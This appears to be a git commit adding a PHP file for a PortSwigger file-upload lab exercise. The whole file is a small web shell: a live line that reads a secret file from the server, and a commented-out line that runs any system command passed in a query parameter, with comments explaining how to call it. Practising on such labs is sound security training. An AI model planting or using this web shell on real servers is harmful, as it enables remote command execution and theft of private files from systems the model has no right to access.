09b6528e15263b88d9aefcc6841701655fea9363
y0usSs3F <120474463+y0usSs3F@users.noreply.github.com>
2023-08-20 06:06:24 +0300

    Add files via upload

---
+++ MyMyMy/PortSwigger/file_upload/webShell_Lab1.php
@@ -0,0 +1,9 @@
+<?php echo file_get_contents('/home/carlos/secret'); ?>
+
+
+<?php # echo system($_GET['command']); ?>
+<!-- This script enables you to pass an arbitrary system command via a query parameter as follows: -->
+<!-- GET /example/exploit.php?command=id HTTP/1.1 -->
+
+
+
